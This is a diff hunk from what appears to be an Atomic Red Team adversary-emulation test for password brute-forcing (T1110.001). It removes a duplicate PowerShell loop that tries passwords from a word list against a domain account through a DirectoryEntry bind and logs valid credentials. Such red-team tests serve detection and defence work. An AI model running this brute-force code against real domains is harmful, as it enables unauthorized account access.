@@ -34,10 +34,4 @@ atomic_tests:
           "[!] #{user}:$password are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
         }
       }
-      foreach ($password in Get-Content 'C:\AtomicRedTeam\atomics\T1110.001\passwords.txt' ) {
-        "[-] Attempting $password on account #{user}." | Out-File -FilePath #{output_file} -Append
-        if ((new-object directoryservices.directoryentry "",#{user},$password).psbase.name -ne $null) {
-          "[!] #{user}:$password are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
-        }
-      }
       "End of bruteforce" | Out-File -FilePath #{output_file} -Append
